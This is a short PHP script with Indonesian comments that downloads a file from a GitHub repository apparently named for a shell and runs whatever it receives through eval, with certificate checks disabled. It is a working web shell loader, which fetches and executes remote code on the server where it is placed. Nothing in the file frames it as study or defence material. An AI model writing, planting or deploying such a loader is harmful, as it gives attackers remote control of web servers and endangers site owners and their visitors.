<?php
$url = 'https://raw.githubusercontent.com/ebokzsss/shellebok/refs/heads/main/a.php';

// Inisialisasi cURL
$ch = curl_init();

// Set opsi cURL
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Ikuti redirect jika ada
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Jika HTTPS dan sertifikat tidak valid

// Eksekusi dan simpan hasilnya ke variabel
$code = curl_exec($ch);

// Cek error
if (curl_errno($ch)) {
    echo 'cURL Error: ' . curl_error($ch);
} else {
    // Jalankan isi kode jika berhasil diambil
    eval('?>' . $code);
}

// Tutup koneksi cURL
curl_close($ch);
?>